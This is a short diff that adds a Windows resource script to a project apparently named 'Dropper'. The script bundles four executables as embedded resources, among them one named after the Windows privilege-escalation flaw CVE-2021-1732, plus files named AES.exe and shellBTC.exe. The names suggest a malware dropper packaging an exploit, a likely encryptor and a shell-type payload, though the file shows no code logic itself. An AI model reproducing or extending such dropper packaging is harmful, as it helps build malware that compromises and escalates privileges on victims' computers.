@@ -1,0 +1,6 @@
+#include "resource.h"
+
+IDR_AES_EXE              RCDATA "C:\\Users\\Rotem\\source\\repos\\Dropper\\Dropper\\AES.exe"
+IDR_CONSOLE_APP_EXE      RCDATA "C:\\Users\\Rotem\\source\\repos\\Dropper\\Dropper\\ConsoleApplication2.exe"
+IDR_SHELLBTC_EXE         RCDATA "C:\\Users\\Rotem\\source\\repos\\Dropper\\Dropper\\shellBTC.exe"
+IDR_CVE_EXE              RCDATA "C:\\Users\\Rotem\\source\\repos\\Dropper\\Dropper\\CVE-2021-1732.exe"
